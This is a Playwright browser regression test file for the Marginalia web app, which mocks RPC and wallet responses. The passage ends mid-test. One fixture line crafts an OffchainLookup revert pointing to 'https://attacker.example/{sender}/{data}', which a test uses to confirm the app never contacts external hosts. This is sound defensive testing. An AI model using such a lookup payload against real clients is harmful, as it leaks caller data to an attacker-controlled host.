// Browser regressions against the production export. No RPC request or transaction leaves the fixture.
// Uses the project's viem and an independently installed Playwright (PLAYWRIGHT_MODULE).
import assert from 'node:assert/strict';
import { createServer } from 'node:http';
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath, pathToFileURL } from 'node:url';
import { decodeFunctionData, encodeFunctionResult, encodeAbiParameters, encodeEventTopics, keccak256, toHex, parseAbi, zeroAddress, zeroHash, maxUint256 } from 'viem';
const { chromium, webkit } = await import(process.env.PLAYWRIGHT_MODULE || 'playwright');
const here = path.dirname(fileURLToPath(import.meta.url));
const dist = path.resolve(process.env.SITE_DIR || path.join(here, '../../dist'));
const before = process.env.MODE === 'before';
const historyOnly = process.env.HISTORY_ONLY === '1';
const historyBefore = process.env.HISTORY_BEFORE === '1';
const evidence = process.env.EVIDENCE_DIR;
if (evidence) fs.mkdirSync(evidence, { recursive: true });
const manifest = JSON.parse(fs.readFileSync(path.join(dist, 'imd-deployment.json')));
const hook = manifest.contracts.find(c => c.name === 'MarginaliaHook').address;
const marg = manifest.contracts.find(c => c.name === 'Marginalia').address;
const imd = manifest.network.pairToken.address;
const router = '0xa3579D7c59A2C0c742fC4e5BB18AF93241D1d263';
const judge = '0xa9e1891d76553195B4Cbcd0F8Db290C8C0FA28B9';
const treasury = '0x3e00372cc4967D2bd006Ca882c51dAf45a9810C8';
const v3 = '0x1F98431c8aD98523631AE4a59f267346ea31F984';
const v2 = '0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f';
const weth = '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2';
const usdc = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
const author = '0x1111111111111111111111111111111111111111';
const other = '0x2222222222222222222222222222222222222222';
const deploy = 26169583n, unit = 10n ** 18n;
const hookAbi = JSON.parse(fs.readFileSync(path.join(dist, 'abi/MarginaliaHook.json')));
const abi = [...hookAbi, ...JSON.parse(fs.readFileSync(path.join(dist, 'abi/MarginaliaRouter.json'))), ...JSON.parse(fs.readFileSync(path.join(dist, 'abi/MarginaliaJudge.json'))), ...parseAbi([
  'function symbol() view returns (string)', 'function decimals() view returns (uint8)', 'function balanceOf(address) view returns (uint256)', 'function allowance(address,address) view returns (uint256)', 'function approve(address,uint256) returns (bool)',
  'function getPool(address,address,uint24) view returns (address)', 'function getPair(address,address) view returns (address)', 'function getLiquidity(bytes32) view returns (uint128)',
])];
const venueType = { type: 'tuple', components: [{ name: 'kind', type: 'uint8' }, { name: 'ref', type: 'bytes32' }, { name: 'quote', type: 'address' }, { name: 'xIsToken0', type: 'bool' }] };
const poolKey = { currency0: imd, currency1: marg, fee: 12500, tickSpacing: 60, hooks: hook };
const poolId = keccak256(encodeAbiParameters([{ type: 'tuple', components: [{name:'currency0',type:'address'}, {name:'currency1',type:'address'}, {name:'fee',type:'uint24'}, {name:'tickSpacing',type:'int24'}, {name:'hooks',type:'address'}] }], [poolKey]));
const venue = { kind: 1, ref: poolId, quote: imd, xIsToken0: false };
const draft = { x: marg, venueKey: `v4:${poolId}`, side: 0, pct: '20', horizonDays: '30', text: 'A review call with a target.', parentId: '' };
const subject = keccak256(encodeAbiParameters([{ type: 'address' }, venueType], [marg, venue]));
const hash = keccak256(encodeAbiParameters([{type:'address'},{type:'address'},venueType,{type:'uint8'},{type:'uint32'},{type:'uint16'},{type:'bytes32'},{type:'string'}], [author,marg,venue,0,12000,30,zeroHash,draft.text]));
const sealKey = keccak256(encodeAbiParameters([{ type: 'address' }, { type: 'bytes32' }], [author, hash]));
const id = toHex(1, { size: 32 });
const tx = toHex(123, { size: 32 });
let f;
const reset = (patch = {}) => { f = { now: Math.floor(Date.now()/1000), head: deploy + 3500n, notes: true, status: 1, deposit: unit/4n, allowance: 100n*unit, claimed: false, pool: unit, count: 1, closed: true, checkpointAge: 7200, sealAge: null, symbol: 'MARG', decimals: 18, token: marg, wallet: true, account: author, chain: '0x1', observe: false, reject: true, requests: [], rpc: [], ...patch }; };
function event(name, values, block, logIndex = 0) {
  const ev = hookAbi.find(a => a.type === 'event' && a.name === name);
  return { address: hook, topics: encodeEventTopics({ abi: [ev], eventName: name, args: values }), data: encodeAbiParameters(ev.inputs.filter(i => !i.indexed), ev.inputs.filter(i => !i.indexed).map(i => values[i.name])), blockNumber: toHex(block), blockHash: toHex(block, {size:32}), transactionHash: tx, transactionIndex: '0x0', logIndex: toHex(logIndex), removed: false };
}
function logs() {
  const out = [];
  if (f.notes) {
    out.push(event('NotePosted', {id, author, x: f.token, class:1, side:0, targetBps:f.thesis ? 0 : 12000, horizonDays:f.thesis ? 0 : 30, parentId:zeroHash, text:'A review note: the evidence matters more than the result.'}, f.noteBlock ?? f.head - 2500n));
    if (f.extraNoteBlock) out.push(event('NotePosted', {id:toHex(2,{size:32}), author, x:f.token, class:1, side:0, targetBps:12000, horizonDays:30, parentId:zeroHash, text:'A note posted while the author was away.'}, f.extraNoteBlock));
    if (f.observe) out.push(event('Observed', {id,xRead:123456n,balance:f.sentinel ? maxUint256 : 5000000n}, f.head-100n, 1));
    if (f.status === 5) out.push(event('Settled', {id,status:5,settlePrice:0n,scoreDelta:-5000n,keeper:zeroAddress}, f.head-90n, 2));
  }
  if (f.sealAge !== null) out.push(event('Sealed', {hash,author,x:marg,venueRef:poolId}, f.head-1200n, 3));
  return out;
}
function block(number) {
  const n = number === 'latest' ? f.head : number === 'finalized' ? f.head-64n : BigInt(number);
  const time = n === (f.noteBlock ?? f.head-2500n) ? f.now - (f.noteAge ?? 90000) : n === f.head-1200n ? f.now-(f.sealAge || 14400) : f.now - Number(f.head-n)*12;
  return { number:toHex(n), hash:toHex(n,{size:32}), parentHash:toHex(n-1n,{size:32}), timestamp:toHex(time), nonce:'0x0000000000000000', difficulty:'0x0', totalDifficulty:'0x0', gasLimit:'0x1c9c380', gasUsed:'0x0', miner:zeroAddress, extraData:'0x', baseFeePerGas:'0x1', size:'0x1', transactions:[], uncles:[], logsBloom:`0x${'0'.repeat(512)}`, receiptsRoot:zeroHash, stateRoot:zeroHash, transactionsRoot:zeroHash, sha3Uncles:zeroHash, mixHash:zeroHash };
}
function value(fn, args, address) {
  const constants = { router, judge, treasury, imd, token:marg, UNIV3_FACTORY:v3, UNIV2_FACTORY:v2, WETH:weth, STAMP:unit/10n, MARG_BUY:unit/4n, BOND_MIN:unit/4n, BOND_MAX:10n*unit, SEAL_MIN:1800n, SEAL_MAX:21600n, SETTLE_WINDOW:21600n, THESIS_GRACE:604800n, SWEEP_AFTER:2419200n, TEXT_MAX:280n, THESIS_TEXT_MAX:8192n, MIN_TARGET_DELTA_BPS:1000, MAX_HORIZON_DAYS:90, KEEPER_BPS:1000n, JUDGE_THRESHOLD:2n*unit, poolId, getPoolKey:poolKey, margPriceInImd:unit, getLiquidity:unit, noteCount: f.notes ? 1n : 0n };
  if (fn in constants) return constants[fn];
  if (fn === 'symbol') return address.toLowerCase() === imd.toLowerCase() ? 'IMD' : f.symbol;
  if (fn === 'decimals') { if(f.noDecimals) throw Error('decimals unavailable'); return f.decimals; }
  if (fn === 'balanceOf') return 100n*unit;
  if (fn === 'allowance') return f.allowance;
  if (fn === 'getPool' || fn === 'getPair') return zeroAddress;
  if (fn === 'validateVenue') return venue;
  if (fn === 'priceWindows') return [f.checkpointAge === null ? 0n : BigInt(f.now-f.checkpointAge),0n,0n,0n,0n,0n,0n];
  if (fn === 'seals') return f.sealAge !== null && args[0].toLowerCase() === sealKey.toLowerCase() ? [BigInt(f.now-f.sealAge),unit,unit,unit, f.wrongSubject ? zeroHash : subject] : [0n,0n,0n,0n,zeroHash];
  if (fn === 'records') return [12345678900n,23,11,8,1,2,1];
  if (fn === 'today') return Math.floor(f.now/86400);
  if (fn === 'week') return Math.floor(f.now/604800);
  if (fn === 'refundPool' || fn === 'thesisPool') return f.pool;
  if (fn === 'notesPerDay') return f.count;
  if (fn === 'refundClaimed') return f.claimed;
  if (fn === 'judgedPaid' || fn === 'judgedSet') return false;
  if (fn === 'weekClosed') return f.closed;
  if (fn === 'noteOf') return {author,x:f.token,side:0,targetBps:f.thesis ? 0 : 12000,horizonDays:f.thesis ? 0 : 30,class:1,status:f.status,postPrice:unit,postBalance:5000000n,deposit:f.deposit,parentId:zeroHash,children:0};
  if (fn === 'approve') return true;
  if (fn === 'note') return id;
  if (['checkpointVenue','seal','sweep','claimDeposit','claimRefund','observe','settle','settleThesis'].includes(fn)) return undefined;
  throw Error(`Unhandled function ${fn}`);
}
function rpc(r) {
  f.rpc.push(r);
  try {
    let result;
    if (r.method === 'eth_chainId') result = '0x1';
    else if (r.method === 'eth_blockNumber') result = toHex(f.head);
    else if (r.method === 'eth_getBlockByNumber') result = block(r.params[0]);
    else if (r.method === 'eth_getLogs') {
      const q = r.params[0];
      if ((f.failLogs && BigInt(q.fromBlock) < f.head-2000n) || (f.refuseBefore && BigInt(q.fromBlock) < f.refuseBefore)) return {jsonrpc:'2.0',id:r.id,error:{code:-32602,message:'Archive requests require a personal token'}};
      result = logs().filter(l => BigInt(l.blockNumber) >= BigInt(q.fromBlock) && BigInt(l.blockNumber) <= BigInt(q.toBlock) && (!q.topics?.[0] || (Array.isArray(q.topics[0]) ? q.topics[0].includes(l.topics[0]) : q.topics[0] === l.topics[0])));
    } else if (r.method === 'eth_call') {
      const call = r.params[0]; const {functionName,args=[]} = decodeFunctionData({abi,data:call.data});
      if (f.offchain && functionName === 'symbol') return {jsonrpc:'2.0',id:r.id,error:{code:3,message:'execution reverted',data:'0x556f1830'+encodeAbiParameters([{type:'address'},{type:'string[]'},{type:'bytes'},{type:'bytes4'},{type:'bytes'}], [call.to,['https://attacker.example/{sender}/{data}'],'0x1234','0x12345678','0x']).slice(2)}};
      const resultValue = value(functionName,args,call.to);
      result = encodeFunctionResult({abi,functionName,result:resultValue});
    } else if (r.method === 'eth_getTransactionReceipt') result = { transactionHash:tx, transactionIndex:'0x0', blockHash:toHex(f.head,{size:32}), blockNumber:toHex(f.head), from:author, to:hook, cumulativeGasUsed:'0x5208', gasUsed:'0x5208', effectiveGasPrice:'0x1', contractAddress:null, logs:[], logsBloom:`0x${'0'.repeat(512)}`, status:'0x1', type:'0x2' };
    else throw Error(`Unhandled RPC ${r.method}`);
    return {jsonrpc:'2.0',id:r.id,result};
  } catch(e) { console.error('RPC fixture error:',e.message); return {jsonrpc:'2.0',id:r.id,error:{code:-32000,message:e.message}}; }
}
const mime = {'.html':'text/html','.js':'text/javascript','.css':'text/css','.json':'application/json','.png':'image/png','.svg':'image/svg+xml'};
const server = createServer((req,res) => {
  let file = decodeURIComponent(req.url.split('?')[0]).replace(/^\/preview\//,'');
  if (file === '') file='index.html';
  const p = path.join(dist,file);
  if (!p.startsWith(dist) || !fs.existsSync(p) || !fs.statSync(p).isFile()) { res.writeHead(404).end(); return; }
  res.setHeader('Content-Type',mime[path.extname(p)] || 'application/octet-stream'); res.end(fs.readFileSync(p));
});
await new Promise(r => server.listen(0,'127.0.0.1',r));
const url = `http://127.0.0.1:${server.address().port}/preview/`;
const browser = await (process.env.BROWSER === 'webkit' ? webkit : chromium).launch({headless:true});
const reports=[];
const metrics={};
let context,page,errors,external;
async function open(route='/',patch={}) {
  if(context) await context.close();
  reset(patch); errors=[]; external=[];
  context = await browser.newContext({viewport:{width:390,height:844},colorScheme:'light'});
  await context.addInitScript(({wallet,account,chain,sealed,hash,draft})=>{
    if(sealed) {localStorage.setItem('marginalia.seals',JSON.stringify({[hash]:draft}));localStorage.setItem('marginalia.prefill',JSON.stringify({draft,hash}));}
    window.__sent=[];
    if(wallet) window.ethereum={request:async({method,params})=>{
      if(method==='eth_accounts'||method==='eth_requestAccounts')return [account];
      if(method==='eth_chainId')return chain;
      if(method==='wallet_switchEthereumChain'){if(chain!=='0x1'){chain='0x1';throw {code:4902,message:'unknown chain'};} return null;}
      if(method==='wallet_addEthereumChain'){window.__added=params;return null;}
      if(method==='eth_sendTransaction'){window.__sent.push(params[0]); return fetch('/__wallet',{method:'POST',body:JSON.stringify(params[0])}).then(async r=>{const v=await r.json();if(v.reject)throw {code:4001,message:'User rejected'};return v.hash;});}
      throw Error(`Unexpected wallet method ${method}`);
    },on:()=>{},removeListener:()=>{}};
  },{wallet:f.wallet,account:f.account,chain:f.chain,sealed:f.sealAge!==null,hash,draft});
  await context.route('**/*',async route=>{
    const u=route.request().url();
    if(manifest.network.rpcUrls.some(r=>u===r||u===r+'/')) {
      const req=JSON.parse(route.request().postData());
      const respond = r => {
        if(f.primaryRefusesHistory && u.startsWith(manifest.network.rpcUrls[0]) && r.method==='eth_getLogs' && BigInt(r.params[0].fromBlock)<f.head-7999n) {
          f.rpc.push(r);f.primaryFailures=(f.primaryFailures||0)+1;
          return {jsonrpc:'2.0',id:r.id,error:{code:-32602,message:'Archive requests require a personal token'}};
        }
        if(u.startsWith(manifest.network.rpcUrls[1]) && r.method==='eth_getLogs')f.secondaryReads=(f.secondaryReads||0)+1;
        return rpc(r);
      };
      const out=Array.isArray(req)?req.map(respond):respond(req);
      await route.fulfill({contentType:'application/json',body:JSON.stringify(out)});
    } else if(u.endsWith('/__wallet')) {
      const t=JSON.parse(route.request().postData());f.requests.push(t);
      if(!f.reject){const {functionName}=decodeFunctionData({abi,data:t.data});if(functionName==='claimRefund')f.claimed=true;if(functionName==='claimDeposit')f.deposit=0n;}
      await route.fulfill({contentType:'application/json',body:JSON.stringify({reject:f.reject,hash:tx})});
    } else if(u.startsWith(url)) await route.continue();
    else {external.push(u);await route.abort();}
  });
  page=await context.newPage();page.on('pageerror',e=>errors.push(e.message));
  await page.goto(url+'#'+route);
  await page.locator('main#main').waitFor({timeout:8000}).catch(async e=>{console.error('BOOT',await page.locator('body').innerText());throw e;});
  await page.getByRole('button',{name:'Refresh',exact:true}).waitFor({timeout:100}).catch(()=>{});
  await page.waitForTimeout(300);
}
const text=()=>page.locator('main#main').innerText();
async function shot(name){if(evidence)await page.screenshot({path:path.join(evidence,name+'.png'),fullPage:true});}
async function callForm() {
  await page.locator('#x').fill(marg);
  await page.getByLabel(/Launch pool/).check();
  await page.locator('#text').fill(draft.text);
  await page.waitForTimeout(200);
}
async function sent(fn){const all=await page.evaluate(()=>window.__sent);const entry=all.map(t=>({...t,...decodeFunctionData({abi,data:t.data})})).find(t=>t.functionName===fn);assert(entry,`No ${fn} wallet request`);return entry;}
async function check(name,fn){try{await fn(); reports.push({name,result:'pass'});console.log('PASS',name);}catch(e){reports.push({name,result:'FAIL',error:e.stack});console.error('FAIL',name,e.message);if(!before)process.exitCode=1;}}
try {
  if (historyOnly) {
    await check('Fresh browser backfills note 1 and exposes it on Note, Author and Pools', async()=>{
      await open('/',{head:deploy+12000n,noteBlock:deploy+1000n});
      await page.getByRole('button',{name:'Refresh',exact:true}).waitFor();
      if(historyBefore) {
        assert.match(await text(),/0 notes loaded/);
        await page.getByRole('button',{name:'Refresh',exact:true}).click();
        await page.getByRole('button',{name:'Refresh',exact:true}).waitFor();
        assert.equal(await page.locator('.entry-text').count(),0);
        assert(f.rpc.filter(r=>r.method==='eth_getLogs').every(r=>BigInt(r.params[0].fromBlock)>deploy+1000n));
      } else {
        await page.locator('.entry-text').waitFor();
        assert(f.rpc.some(r=>r.method==='eth_getLogs' && BigInt(r.params[0].fromBlock)===deploy));
        assert(!(await text()).includes('History incomplete'));
      }
      await page.evaluate(()=>location.hash='#/note/0x1');
      if(historyBefore) await page.getByText('This note is not in the available history; older events may be missing.').waitFor();
      else {
        await page.getByRole('heading',{name:/Note № 1/}).waitFor();
        await page.evaluate(a=>location.hash='#/author/'+a,author);await page.locator('.entry-text').waitFor();
        await page.getByRole('navigation',{name:'Sections'}).getByRole('link',{name:'Pools',exact:true}).click();
        await page.getByRole('button',{name:/^Claim deposit/}).waitFor();
        await page.getByRole('button',{name:/^Claim refund/}).waitFor();
      }
    });
    await check('Returning browser retrieves a served 9,000-block gap across reload', async()=>{
      await open('/',{noteBlock:deploy+100n});await page.locator('.entry-text').waitFor();
      f.head=deploy+12500n;f.extraNoteBlock=deploy+4000n;f.refuseBefore=f.head-10000n;f.rpc=[];
      await page.reload();await page.getByRole('button',{name:'Refresh',exact:true}).waitFor();
      if(historyBefore) {
        assert.equal(await page.locator('.entry-text').count(),1);
        f.head+=10n;await page.getByRole('button',{name:'Refresh',exact:true}).click();
        await page.getByRole('button',{name:'Refresh',exact:true}).waitFor();assert.equal(await page.locator('.entry-text').count(),1);
      } else {
        assert.equal(await page.locator('.entry-text').count(),2);
        assert(!(await text()).includes('History incomplete'));
      }
    });
    await check('Partial history keeps ledger text on the first 390×844 screen', async()=>{
      await open('/',{wallet:false,head:deploy+12000n,noteBlock:deploy+9500n,...(historyBefore?{}:{refuseBefore:deploy+4001n})});
      await page.getByRole('button',{name:'Refresh',exact:true}).waitFor();await page.locator('.entry-text').waitFor();
      await shot(historyBefore?'history-before-fold':'history-after-fold');
      const box=await page.locator('.entry-text').first().boundingBox();metrics.partialFirstNote=box;
      if(historyBefore) assert(box.y>844,JSON.stringify(box));
      else {
        assert(box.y+box.height<844,JSON.stringify(box));
        const summary=page.locator('.history summary');assert.match(await summary.innerText(),/1 note loaded.*History incomplete/);
        await summary.focus();await page.keyboard.press('Enter');
        assert(await page.locator('.history').getAttribute('open')!==null);
        assert.match(await text(),/did not serve blocks/);
        assert.match(await text(),/26169583/);
        f.refuseBefore=null;
        await page.getByRole('button',{name:'Load more history',exact:true}).click();
        await page.getByRole('button',{name:'Refresh',exact:true}).waitFor();
        assert(!(await summary.innerText()).includes('History incomplete'));
        await summary.press('Enter');
        assert(await page.evaluate(()=>document.documentElement.scrollWidth<=innerWidth));
        assert.equal(errors.length,0);assert.deepEqual(external,[]);
      }
      await shot(historyBefore?'history-before-390':'history-after-390');
    });
    if(!historyBefore) await check('Historical requests fall back to the other approved RPC', async()=>{
      await open('/',{head:deploy+12000n,noteBlock:deploy+1000n,primaryRefusesHistory:true});
      await page.getByRole('button',{name:'Refresh',exact:true}).waitFor();await page.locator('.entry-text').waitFor();
      assert(f.primaryFailures>0);assert(f.secondaryReads>0);assert(!(await text()).includes('History incomplete'));assert.deepEqual(external,[]);
    });
    if(!historyBefore) await check('Backfill cursor survives reload and detail control advances another batch', async()=>{
      await open('/',{wallet:false,head:deploy+50000n,noteBlock:deploy+16000n});
      await page.getByRole('button',{name:'Refresh',exact:true}).waitFor();
      const cursor=()=>page.evaluate(()=>JSON.parse(localStorage.getItem(Object.keys(localStorage).find(k=>k.startsWith('marginalia.logs.')))).historyCursor.bigint);
      const first=BigInt(await cursor());assert(first>deploy);
      await page.reload();await page.getByRole('button',{name:'Refresh',exact:true}).waitFor();assert(BigInt(await cursor())>first);
      await page.locator('.history summary').click();
      await page.getByRole('button',{name:'Load more history',exact:true}).click();
      await page.getByRole('button',{name:'Refresh',exact:true}).waitFor();await page.locator('.entry-text').waitFor();
      assert.equal(await page.locator('.entry-text').count(),1);
      await page.locator('.history summary').click();
      for(const width of [320,390,768,1440]) {
        await page.setViewportSize({width,height:width===1440?1000:844});
        assert(await page.evaluate(()=>document.documentElement.scrollWidth<=innerWidth));
        if(width===390){const b=await page.locator('.entry-text').first().boundingBox();assert(b.y+b.height<844);}
        await shot('history-partial-'+width);
      }
      await page.setViewportSize({width:390,height:844});await page.emulateMedia({colorScheme:'dark',reducedMotion:'reduce'});
      await page.locator('.history summary').focus();await page.keyboard.press('Tab');await page.keyboard.press('Shift+Tab');await shot('history-dark-focus');
      metrics.historySummary=await page.locator('.history summary').evaluate(el=>({color:getComputedStyle(el).color,paper:getComputedStyle(document.body).backgroundColor,font:getComputedStyle(el).fontSize,height:el.getBoundingClientRect().height,outline:getComputedStyle(el).outlineStyle}));
      assert.equal(metrics.historySummary.outline,'solid');
      await page.keyboard.press('Enter');assert(await page.locator('.history').getAttribute('open')!==null);
      await shot('history-details-390');
      await page.setViewportSize({width:320,height:844});assert(await page.evaluate(()=>document.documentElement.scrollWidth<=innerWidth));
      await page.evaluate(()=>document.documentElement.style.fontSize='34px');
      assert(await page.evaluate(()=>document.documentElement.scrollWidth<=innerWidth));
    });
  } else {
  await check('Feed first screen and copy',async()=>{
    await open('/',{wallet:false});await page.locator('.entry-text').waitFor();
    const bounds=await page.locator('.entry-text').first().boundingBox();metrics.firstNote={viewport:390,...bounds};
    if(before){assert(bounds.y>844);console.log('reproduced note text y=',bounds.y);}else {assert(bounds.y+bounds.height<844);assert.match(await text(),/Notes and theses/);assert(!/\bBUY\b|\bSELL\b/i.test(await text()));}
    await shot('feed-390');
  });
  await check('Author mobile values remain whole',async()=>{
    await open('/author/'+author);
    for(const width of [320,390]){await page.setViewportSize({width,height:844});
      if(before){const cell=page.locator('tbody td').first();const box=await cell.boundingBox();assert(box.height>35);console.log('reproduced wrapped score height',width,box.height);}else {
        const dd=page.locator('.record-facts dd').first();assert.equal(await dd.innerText(),'1234567.89');const box=await dd.boundingBox();metrics['authorScore'+width]={text:await dd.innerText(),...box};assert(box.height<30);assert.equal(await page.locator('.record-facts dt').allTextContents().then(a=>a.length),7);assert(await page.evaluate(()=>document.documentElement.scrollWidth<=innerWidth));
      }await shot('author-'+width);}
  });
  await check('Router approval exactly equals displayed precision',async()=>{
    await open('/post',{allowance:0n});await page.getByLabel(/Thesis ·/).check();await page.locator('#thesis').fill('A review-only thesis, never sent.');await page.locator('#bond').fill('0.25009');
    const button=page.getByRole('button',{name:before?'Approve 0.6 IMD to the router':'Approve 0.60009 IMD to the router',exact:true});await button.click();
    await page.getByRole('alert').filter({hasText:/rejected/}).waitFor();const req=await sent('approve');assert.equal(req.args[0].toLowerCase(),router.toLowerCase());assert.equal(req.args[1],600090000000000000n);
    if(!before){assert.match(await text(),/0.25009 IMD/);assert.match(await text(),/Authorizes exactly 0.60009 IMD/);assert(await button.isEnabled());}
  });
  await check('Target precision and uint32 guards',async()=>{
    await open('/post');await callForm();await page.getByLabel(before?/SELL ·/:/Downward call/).check();await page.locator('#pct').fill('99.999');
    if(before){await page.getByRole('button',{name:'Post the call',exact:true}).click();await page.getByRole('alert').filter({hasText:/rejected/}).waitFor();assert.equal((await sent('note')).args[0].targetBps,0);}else{await page.locator('#pct-error').waitFor();assert.equal(await page.locator('#pct').getAttribute('aria-invalid'),'true');assert.equal(await page.getByRole('button',{name:'Post the call',exact:true}).count(),0);}
    await open('/seal');await callForm();await page.locator('#pct').fill('42949573');await page.waitForTimeout(200);
    if(before)assert(errors.some(e=>e.includes('32-bit')));else{assert.equal(errors.length,0);assert.match(await text(),/42949572.95/);await page.locator('#pct').fill('Infinity');assert.match(await text(),/finite percentage/);}
  });
  await check('Seal router-only restriction and checkpoint prerequisite',async()=>{
    await open('/seal',{allowance:0n,checkpointAge:null});await callForm();
    if(before){assert(!(await text()).includes('Checkpoint venue'));await page.getByRole('button',{name:'Approve 0.1 IMD to the hook',exact:true}).click();await page.getByRole('alert').filter({hasText:/rejected/}).waitFor();assert.equal((await sent('approve')).args[0].toLowerCase(),hook.toLowerCase());}
    else{assert.match(await text(),/New sealing is unavailable/);assert.match(await text(),/wait one hour before sealing/);assert(await page.getByRole('button',{name:'Seal unavailable'}).isDisabled());assert(await page.getByRole('button',{name:'Checkpoint venue',exact:true}).isDisabled());assert.equal((await page.evaluate(()=>window.__sent)).length,0);await shot('seal-policy');}
  });
  await check('Mature seal reveals with stale checkpoint',async()=>{
    await open('/post',{sealAge:14400,checkpointAge:32400});await page.getByRole('button',{name:'Post the call',exact:true}).waitFor();
    const post=page.getByRole('button',{name:'Post the call',exact:true});
    if(before){assert(await post.isDisabled());assert.match(await text(),/older than 6 hours/);}else{
      assert(await post.isEnabled());assert.match(await text(),/no new checkpoint is needed/);await post.click();await page.getByRole('alert').filter({hasText:/rejected/}).waitFor();const req=await sent('note');assert.equal(req.args[0].targetBps,12000);assert(req.args[4] <= BigInt(f.now-f.sealAge+21600));assert(req.args[4] <= BigInt(f.now+1210));
      await page.locator('#text').fill('Changed draft');assert(await post.isDisabled());assert.match(await text(),/do not match/);
    }
  });
  await check('Older daily and closed weekly sweeps',async()=>{
    await open('/pools');
    if(before){assert.equal(await page.getByRole('button',{name:/^Sweep /}).count(),0);assert.match(await text(),/Older epochs can be swept from a wallet directly/);}else {
      await page.getByRole('button',{name:/^Sweep day /}).click();await page.getByRole('alert').filter({hasText:/rejected/}).waitFor();const req=await sent('sweep');assert.equal(req.args[0],0);assert(f.now>=(req.args[1]+1)*86400+2419200);
      await page.locator('#sweep-kind').selectOption('1');await page.getByRole('button',{name:/^Sweep week /}).click();await page.waitForFunction(()=>window.__sent.length===2);assert.equal((await page.evaluate(()=>window.__sent)).length,2);const ws=(await page.evaluate(()=>window.__sent)).at(-1);assert.equal(decodeFunctionData({abi,data:ws.data}).args[0],1);
      f.closed=false;await page.getByRole('button',{name:'Refresh from chain'}).click();await page.waitForTimeout(300);assert(await page.getByRole('button',{name:/^Sweep week /}).isDisabled());assert.match(await text(),/not closed/);
    }
  });
  await check('Pools claims exclude paid notes and refresh after confirmations',async()=>{
    await open('/pools',{reject:false});
    if(before){assert.equal(await page.getByRole('button',{name:/^Claim /}).count(),0);f.claimed=true;f.deposit=0n;await page.getByRole('button',{name:'Refresh from chain'}).click();await page.waitForTimeout(400);assert.match(await text(),/refunds are available for 1/);}else{
      await page.getByRole('button',{name:/^Claim deposit/}).click();await page.waitForTimeout(400);assert.equal(f.deposit,0n);assert.equal(await page.getByRole('button',{name:/^Claim deposit/}).count(),0);
      await page.getByRole('button',{name:/^Claim refund/}).click();await page.waitForTimeout(400);assert(f.claimed);assert.equal(await page.getByRole('button',{name:/^Claim refund/}).count(),0);assert.match(await text(),/Writer refunds available: 0/);
      await open('/pools',{claimed:true,deposit:0n});assert.match(await text(),/Writer refunds available: 0/);assert.equal(await page.getByRole('button',{name:/^Claim /}).count(),0);
    }
  });
  await check('Observation raw integers and token decimals',async()=>{
    await open('/note/0x1',{token:usdc,symbol:'USDC',decimals:6,observe:true});await page.locator('tbody').waitFor();
    if(before){assert.deepEqual((await page.locator('tbody tr').first().locator('td').allTextContents()).slice(1,3),['0','0']);}
    else{assert.match(await text(),/123456/);assert.equal(await page.locator('.observations tbody td').nth(2).innerText(),'5');assert.match(await text(),/Author balance \(USDC\)/);
      await open('/note/0x1',{token:usdc,symbol:'USDC',noDecimals:true,observe:true});assert.match(await text(),/5000000 raw units/);
      await open('/note/0x1',{observe:true,sentinel:true});assert.match(await text(),/Unavailable \(token read failed\)/);await shot('note-evidence');}
  });
  await check('Retracted entries omit zero settlement price',async()=>{
    await open('/',{status:5,deposit:0n});
    if(before)assert.match(await text(),/settled at price 0 · outcome status 5/);else {assert(!(await text()).includes('settled at price'));assert.match(await text(),/retracted/i);}
  });
  await check('CCIP lookup cannot contact an external host',async()=>{
    await open('/post',{offchain:true});await page.locator('#x').fill(marg);await page.waitForTimeout(800);
    if(before)assert(external.some(u=>u.startsWith('https://attacker.example/')));else assert.deepEqual(external,[]);
  });
  await check('Refused log ranges do not fail all pages',async()=>{
    await open('/',{head:deploy+650000n,failLogs:true,sealAge:14400});await page.waitForTimeout(before?7500:4000);
    if(before)assert.match(await text(),/Could not read the feed/);else{assert.match(await text(),/History incomplete/);assert(!(await text()).includes('Could not read the feed'));
      const calls=f.rpc.filter(r=>r.method==='eth_getLogs');const ranges=new Set(calls.map(r=>r.params[0].fromBlock+'-'+r.params[0].toBlock));assert(ranges.size<=8);assert(calls.every(r=>BigInt(r.params[0].toBlock)-BigInt(r.params[0].fromBlock)<2000n));
      await page.getByRole('link',{name:'Seal',exact:true}).click();await page.getByRole('heading',{name:'Your seals',exact:true}).waitFor();assert.match(await text(),/Your seals/);assert.match(await text(),/reveal open/i);}
  });
  await check('Share artwork metadata and static subpath assets',async()=>{
    await open('/',{notes:false,wallet:false});
    if(before)assert.equal(await page.locator('meta[property="og:image"]').count(),0);else{
      const image=await page.locator('meta[property="og:image"]').getAttribute('content');assert(image);const response=await page.request.get(new URL(image,url).href);assert.equal(response.status(),200);assert.equal(response.headers()['content-type'],'image/png');assert.equal(await page.locator('meta[name="twitter:image"]').getAttribute('content'),image);assert.equal(errors.length,0);
      const empty=await page.locator('.empty').boundingBox();assert(empty.y+empty.height<844);await shot('empty-390');
    }
  });
  if(!before){
    await check('Checkpoint countdown and posting prerequisites',async()=>{
      await open('/post',{checkpointAge:null});await callForm();const cp=page.getByRole('button',{name:'Checkpoint venue',exact:true});await cp.click();await page.getByRole('alert').filter({hasText:/rejected/}).waitFor();const req=await sent('checkpointVenue');assert.equal(req.to.toLowerCase(),router.toLowerCase());assert(await page.getByRole('button',{name:'Post the call',exact:true}).isDisabled());
      await open('/post',{checkpointAge:1800});await callForm();assert.match(await text(),/Posting opens in/);assert(await page.getByRole('button',{name:'Post the call',exact:true}).isDisabled());
      await open('/post',{checkpointAge:7200});await callForm();assert(await page.getByRole('button',{name:'Post the call',exact:true}).isEnabled());
      await open('/seal',{checkpointAge:1800});await callForm();assert.match(await text(),/Sealing opens in/);assert(await page.getByRole('button',{name:'Seal unavailable'}).isDisabled());
      await open('/seal',{checkpointAge:25000});await callForm();assert.match(await text(),/older than 6 hours/);assert(await page.getByRole('button',{name:'Seal unavailable'}).isDisabled());
    });
    await check('Permissionless keeper actions use exact ABI and note id',async()=>{
      for(const [patch,label,fn] of [[{status:0,noteAge:30*86400+1000},'Observe','observe'],[{status:0,noteAge:30*86400+21601},'Settle','settle'],[{status:6,thesis:true,noteAge:7*86400+1},'Forfeit thesis','settleThesis']]){
